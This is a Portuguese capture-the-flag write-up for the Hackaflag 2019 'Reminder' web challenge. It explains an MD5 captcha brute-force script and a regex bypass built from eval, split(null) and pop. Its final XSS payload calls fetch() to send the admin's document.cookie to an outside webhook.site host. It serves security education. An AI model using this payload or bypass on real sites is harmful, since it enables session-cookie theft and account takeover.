# Reminder

- Desafio da etapa de Goiânia do Hackaflag 2019
- Data do desafio: 2019-06-01
- Categoria: web
- URL original: `http://68.183.31.62:3232/`

Ao acessar a URL do desafio, encontramos uma página com um campo `textarea` e um botão que carrega a mesma página, inserindo o conteúdo do campo anterior no parâmetro `data` da URL. Também temos um link para a página `/contact`.

## Página inicial

No código-fonte da página inicial, temos os seguintes trechos JavaScript:

```
<script type="text/javascript">
	window.onload=function(){
		if(!window.localStorage.getItem('data')){
			var t = location.search;
			if(/<([a-z])/i.test(unescape(JSON.parse('"'+decodeURIComponent(location.search.split("=")[1])+'"')))){
				var text = 'undefined';
			}else{
				window.localStorage.setItem('data',decodeURIComponent(location.search.split('=')[1]));
			}
		}
	}
</script>
<script id="message"></script>
<a href="contact">contact</a>
<script>
	function inMessage(message){
		regex = /^[a-z.()]+$/;

		if(regex.test(message)){
			var ms = document.getElementById('message');
    		console.log(ms);
			ms.innerHTML=unescape(message);
		}
	}

	function x(){
		var t;
		return t = {},
		window.location.search.replace("?","").split("&").forEach(function(e){
			var n;
			return n = e.split("="),
			t[n[0]] = n[1];
		}), t.message ? inMessage(t.message) : void 0
	}

	onload=function(){ x(); }
</script>
```

O primeiro trecho cria uma função que manipula o `localStorage` e atribui essa função ao método `window.onload`, que é executado quando a página termina de carregar. No entanto, o final do último trecho também sobrescreve o método `onload` (omitindo o objeto `window`), por isso a primeira função criada nunca é executada. Podemos ignorar este trecho do código.

A função `x` será executada ao carregar a página. Resumidamente, se houver um parâmetro na URL chamado `message`, a função `inMessage` será executada com `message` como argumento.

A função `inMessage` realiza um teste de expressão regular para a variável `message` e, caso a variável contenha apenas letras minúsculas e os caracteres `(`, `)` e `.`, o conteúdo será inserido na tag com id `message` (que convenientemente é uma tag `script`). Se carregarmos a página com o parâmetro `?message=alert()`, verificamos que o código é executado. No entanto, se inserirmos `?message=alert(1)`, o código não é executado porque o caractere `1` não passa no teste de expressão regular.

## Página `contact`

A página `/contact` apresenta um formulário com dois campos: um captcha e uma URL. Além do formulário, há uma string hexadecimal aleatória de 4 caracteres. O código-fonte dá a dica para resolver o captcha: `<!-- substr(md5(string),0,4) == 62d7 -->`, isto é, os 4 primeiros caracteres do hash MD5 do captcha devem ser iguais à string apresentada na página.

Por se tratar de apenas 4 caracteres hexadecimais, há apenas 16<sup>4</sup> = 65536 possibilidades, então é fácil encontrar uma colisão parcial. Este script em Python itera de 1 a 1000000 até achar um resultado compatível.

```
import sys
import hashlib

if len(sys.argv) < 2:
	print('Missing argument')

for i in range(1, 1000000):
	m = hashlib.md5()
	m.update(str(i).encode('utf-8'))
	h = m.hexdigest()[:4]
	if h == sys.argv[1][:4]:
		print(str(i) + ' - ' + h)
		break
```

Ao executar `python hash.py 62d7` obtemos o valor `11528`, que deve ser inserido no campo de captcha.

Com o captcha válido, a requisição é enviada com sucesso. Ao enviar alguma URL, obtemos a mensagem "O admin ira ver sua mensagem em breve bla bla bla...". Esta mensagem, juntamente com o código JavaScript da página inicial, sugere que é possível realizar um ataque de stored XSS para obter os cookies da sessão do administrador.

## Payload

Agora, o desafio é criar um código JavaScript que obtenha os cookies da sessão e que passe no teste da expressão regular. Não podemos fazer isso diretamente porque a expressão regular `/^[a-z.()]+$/` é muito restritiva, portanto precisamos contornar este teste. Uma função útil é a `eval`, que recebe uma string e a interpreta como JavaScript; se o parâmetro `message` for igual a `eval(location.search)`, o código executado será `?message=eval(location.search)`, que não é JavaScript válido, mas nos dá um ponto de partida. Podemos adicionar um segundo parâmetro `?message=eval(location.search)&bypass=alert("Hello!")` e tentar executá-lo mudando apenas o argumento de `eval` seguindo as limitações da expressão regular.

Podemos usar o método `split` para dividir a string, mas não podemos colocar uma string como argumento porque o caractere `"` não passaria no teste de expressão regular. Entretanto, o método `split` converte outros tipos para string, e nós podemos fazer algumas manipulações para obter apenas a parte da string que nos interessa.

- o método `split(x)` divide uma string em um array de strings separados pela variável `x` convertida para string;
- se nenhum argumento for passado, `split` retorna um array contendo a string original;
- o método `split(null)` converterá a constante `null` para a string `"null"` e retornará um array de strings separadas pela string `"null"`;
- `?message=eval(location.search.split(null))&bypass=nullalert("Hello")` retornará o array `["?message=eval(location.search.split(null))&bypass=", "alert(%22Hello%22)"]`;
- para mudar as aspas de `%22` para `"`, devemos utilizar a função `unescape`;
- para obter o segundo elemento do array, basta usarmos o método `pop`;
- `?message=eval(unescape(location.search.split(null).pop()))&bypass=nullalert("Hello")` retornará a string `"alert("Hello")"`, que é exatamente o que queremos.

O separador não deve aparecer no código a ser injetado. Por exemplo, `?message=eval(unescape(location.search.split(null).pop()))&bypass=nullalert("this is null")` retornará a string `")` porque há uma segunda ocorrência da string `null`.

É possível utilizar outros separadores:

- a propriedade estática `length` retorna 1 (não sei por quê, só sei que [é assim](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/length));
- `window.name.length` retorna 0;
- `location.search.length` retorna o tamanho de `location.search`, que pode ser facilmente incrementado;
- `window.name.includes()` retorna `false`;
- `window.name.includes(window.name)` retorna `true`.

Agora podemos executar (quase) qualquer código JavaScript, sem restrição de caracteres.

Em um ataque real, como não saberíamos quando um administrador executaria o código, seria necessário ter um servidor que armazenasse as requisições enviadas. Para testes e CTFs, podemos utilizar um serviço como http://webhook.site. Este site gera uma URL com um ID aleatório no formato `http://webhook.site/{id}` e as requisições feitas para esta URL podem ser monitoradas pelo link `http://webhook.site/#!/{id}` (atenção para o acréscimo de `#!` na URL).

O comando `fetch("http://webhook.site/{id}?cookie=" + document.cookie)` insere os cookies como parâmetros de URL, que poderão ser observados pelo link anterior.

O payload final será `http://68.183.31.62:3232/?message=eval(unescape(location.search.split(null).pop()))&bypass=nullfetch("http://webhook.site/{id}?data=" + document.cookie)` e, ao enviá-lo e verificar as chamadas realizadas, encontramos o parâmetro `data=token%3DHACKAFLAG%7Bgr34t_p4yl04d_n0%3F%7D`. Usando a função `unescape`, obtemos a flag `HACKAFLAG{gr34t_p4yl04d_n0?}`.
